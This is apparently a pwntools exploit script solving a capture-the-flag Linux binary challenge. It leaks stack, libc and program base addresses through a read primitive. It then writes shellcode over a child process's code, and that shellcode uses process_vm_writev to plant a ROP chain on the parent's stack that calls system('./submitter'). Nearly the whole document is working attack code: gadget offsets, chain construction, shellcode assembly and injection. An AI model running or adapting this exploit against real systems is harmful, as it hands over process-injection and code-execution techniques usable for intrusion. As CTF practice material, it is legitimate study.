from pwn import *
import struct

context.update(arch='amd64', bits=64, endian='little', os='linux')

# Exploit configs
binary = ELF('challenge_patched')
host = 'chal.host.name'
port = 1337
#local_libc = ELF('./libc-x.xx.so', checksec=False)
#remote_libc = ELF('./libc-x.xx.so', checksec=False)
#ld = ELF('./ld-x.xx.so', checksec=False)

#call GDB
##############################################################################################
def launch_gdb(breakpoints=[], cmds=[]):
    if args.GDB:
        info("Attaching Debugger")
        cmds.append('handle SIGALRM ignore')
        cmds.append('set follow-fork-mode parent')
        #cmds.append('set follow-fork-mode child')
        for b in breakpoints:
            cmds.insert(0,'b *' + str(binary.address + b))
        gdb.attach(io, gdbscript='\n'.join(cmds))
    else:
        return
##############################################################################################

def process_vm_readv(addr)->int:
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Address: ", f"{addr:016x}".encode())
    io.recvuntil(b"Value: ")
    return int(io.recvline().decode(), 16)

def process_vm_writev(addr, value):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"Value: ", f"{value:016x}".encode())
    io.sendlineafter(b"Address: ", f"{addr:016x}".encode())

if __name__ == '__main__':
    # call with DEBUG to change log level
    # call with GDB to attach gdb
    # call with REMOTE to run against live target
    if args.REMOTE:
        args.GDB = False # disable gdb when working remote
        io = remote(host, port)
#        libc = remote_libc
    else:
#        io = process([ld.path, binary.path], env={'LD_PRELOAD': remote_libc.path})
        io = process(binary.path)
#        libc = remote_libc
    if not args.REMOTE: #in local case, get bin base address from proc/self
        for mmap in open('/proc/{}/maps'.format(io.pid),"rb").readlines():
            mmap = mmap.decode()
            if binary.path.split('/')[-1] == mmap.split('/')[-1][:-1]:
                binary.address = int(mmap.split('-')[0],16)
                break
    
    #break at 0x1552 <writev_helper+86>     call   process_vm_writev@plt
    #break at 0x1613 <parent+162>    jmp    kill@plt                <kill@plt>
    launch_gdb(breakpoints=[0x1613], cmds=[])

    addr_some_stack = process_vm_readv(0)
    log.info(f"addr_some_stack: " + hex(addr_some_stack))

    parent_stack_ret = addr_some_stack - 0x110
    log.info(f"parent_stack_ret: " + hex(parent_stack_ret))

    addr_libc_base = process_vm_readv(addr_some_stack - 0x70) - 0x29E40
    log.info(f"addr_libc_base: " + hex(addr_libc_base))

    addr_challenge_base = process_vm_readv(addr_some_stack - 0x20) - 0x1285
    log.info(f"addr_challenge_base: " + hex(addr_challenge_base))

    addr_init = addr_challenge_base + 0x1349
    addr_child_loop_jnz = addr_challenge_base + 0x1486
    log.info(f"addr_child_loop_jnz: " + hex(addr_child_loop_jnz))


    free_space = addr_challenge_base + 0x3800

    pop_rdi = addr_libc_base + 0x2a3e5
    pop_rsi = addr_libc_base + 0x2be51
    pop_rax = addr_libc_base + 0x45eaf
    libc_ret = addr_libc_base + 0x29139
    mov_qwordRsiPlus0x10_rax = addr_libc_base + 0x165862 # mov qword [rsi+0x10], rax; ret
    submitter_string = b'./submitter'
    libc_system = addr_libc_base + 0x50d70
    libc_binsh = addr_libc_base + 0x1d8678

    rop0 = (pop_rsi)
    rop1 = (free_space-0x10)
    rop2 = (pop_rax)
    rop3 = struct.unpack('<Q', submitter_string[0:8].ljust(8, b'\0'))[0]
    rop4 = (mov_qwordRsiPlus0x10_rax)

    rop5 = (pop_rsi)
    rop6 = (free_space-0x10+8)
    rop7 = (pop_rax)
    rop8 = struct.unpack('<Q', submitter_string[8:].ljust(8, b'\0'))[0]
    rop9 = (mov_qwordRsiPlus0x10_rax)

    # system("./submitter")
    rop10 = (pop_rdi)
    rop11 = (free_space)
    rop12 = (libc_system)

    shell_asm = f'''
    push	rbp
	mov	rbp, rsp
	sub	rsp, 192
	mov rax, 110
    syscall
	mov	DWORD PTR -4[rbp], eax
	movabs	rax, {rop0}
	movabs	rdx, {rop1}
	mov	QWORD PTR -160[rbp], rax
	mov	QWORD PTR -152[rbp], rdx
	movabs	rax, {rop2}
	movabs	rdx, {rop3}
	mov	QWORD PTR -144[rbp], rax
	mov	QWORD PTR -136[rbp], rdx
	movabs	rax, {rop4}
	movabs	rdx, {rop5}
	mov	QWORD PTR -128[rbp], rax
	mov	QWORD PTR -120[rbp], rdx
	movabs	rax, {rop6}
	movabs	rdx, {rop7}
	mov	QWORD PTR -112[rbp], rax
	mov	QWORD PTR -104[rbp], rdx
	movabs	rax, {rop8}
	movabs	rdx, {rop9}
	mov	QWORD PTR -96[rbp], rax
	mov	QWORD PTR -88[rbp], rdx
	movabs	rax, {rop10}
	movabs	rdx, {rop11}
	mov	QWORD PTR -80[rbp], rax
	mov	QWORD PTR -72[rbp], rdx
	movabs	rax, {rop12}
	movabs	rdx, {rop12}
	mov	QWORD PTR -64[rbp], rax
	mov	QWORD PTR -56[rbp], rdx
	movabs	rax, {rop12}
	movabs	rdx, {rop12}
	mov	QWORD PTR -48[rbp], rax
	mov	QWORD PTR -40[rbp], rdx
	lea	rax, -160[rbp]
	mov	QWORD PTR -176[rbp], rax
	mov	QWORD PTR -168[rbp], 128
	movabs	rax, {parent_stack_ret}
	mov	QWORD PTR -16[rbp], rax
	mov	rax, QWORD PTR -16[rbp]
	mov	QWORD PTR -192[rbp], rax
	mov	QWORD PTR -184[rbp], 128
	lea	rdx, -192[rbp]
	lea	rsi, -176[rbp]
	mov	eax, DWORD PTR -4[rbp]
	mov	r9d, 0
	mov	r8d, 1
	mov	rcx, rdx
	mov	edx, 1
	mov	edi, eax
	mov	eax, 0
	mov rax, 311
    syscall
	cdqe
	mov	QWORD PTR -24[rbp], rax
	mov	eax, 231
    syscall
    '''

    shell = asm(shell_asm)
    shell += b'\x90'* (8 - (len(shell) % 8))
    bins = []
    for i in range(0, len(shell), 8):
        # 8バイトを整数に変換（little-endian の場合）
        bin = struct.unpack('<Q', shell[i:i+8])[0]
        bins.append(bin)

    for i in range(1, len(bins)):
        process_vm_writev(addr_child_loop_jnz+8*i, bins[i])
    
    process_vm_writev(addr_child_loop_jnz, bins[0])

    print("done...")
    
    io.recvuntil(b'Choice:')
    io.sendline(b'3')

    io.interactive()